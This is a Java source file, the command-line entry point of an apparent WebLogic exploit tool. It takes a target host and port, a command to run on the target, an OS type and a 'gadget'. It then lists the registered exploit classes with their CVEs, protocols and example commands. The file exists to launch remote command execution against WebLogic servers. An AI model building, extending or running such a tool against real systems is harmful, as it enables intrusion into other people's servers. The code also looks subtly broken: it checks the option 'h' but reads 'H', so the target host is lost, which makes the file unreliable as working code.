package org.weblogic;

import org.apache.commons.cli.*;
import org.weblogic.exploit.Exploit;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.exploit.util.ExploitRunner;
import org.weblogic.exploit.util.Strings;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class Cli {
    public static String host = "";
    public static String port = "7001";
    public static String command = "whoami";
    public static String os;
    public static String gadget;
    public static CommandLine cmdLine;
    public static boolean https = false;

    public static void parser(String[] args) throws ParseException {
        Options options = new Options();
        options.addOption("h", true, "Target Host");
        options.addOption("p", true, "Target Port");
        options.addOption("c", true, "Execute Command");
        options.addOption("g", true, "Gadget");
        options.addOption("os", true, "Os Type [windows,linux]");
        options.addOption("https", false, "Https or tls");
        CommandLineParser parser = new DefaultParser();
        cmdLine = parser.parse(options, args);
        if (cmdLine.hasOption("h")) {
            host = cmdLine.getOptionValue("H");
        } else {
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("Weblogic", options);
            printGadgets();
            System.exit(0);
        }

        if (cmdLine.hasOption("p")) {
            port = cmdLine.getOptionValue("p");
        }

        if (cmdLine.hasOption("g")) {
            gadget = cmdLine.getOptionValue("g");
            try {
                ExploitRunner.getExploitClass(gadget);
            } catch (Exception e) {
                System.err.println("Invalid gadget type '" + gadget + "'");
                printGadgets();
                System.exit(0);
            }
        } else {
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("WLExploit", options);
            printGadgets();
            System.exit(0);
        }
        if (cmdLine.hasOption("c")) {
            command = cmdLine.getOptionValue("c");
        }
        if (cmdLine.hasOption("os")) {
            os = cmdLine.getOptionValue("os");
        }
        if (cmdLine.hasOption("https")) {
            https = true;
        }
    }

    private static void printGadgets() {
        System.err.println("  Available gadget types:");
        final List<Class<? extends Exploit>> payloadClasses =
                new ArrayList<Class<? extends Exploit>>(Exploit.Utils.getExploitClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Gadget", "CVE", "Protocol", "Command Example", "Description"});
        rows.add(new String[]{"-------", "------------", "-------", "---------------------", "----------------------------------"});
        for (Class<? extends Exploit> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Gadget.Utils.getCVE(payloadClass),
                    Gadget.Utils.getProtocol(payloadClass),
                    Gadget.Utils.getCommand(payloadClass),
                    Gadget.Utils.getDescription(payloadClass),
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }

}
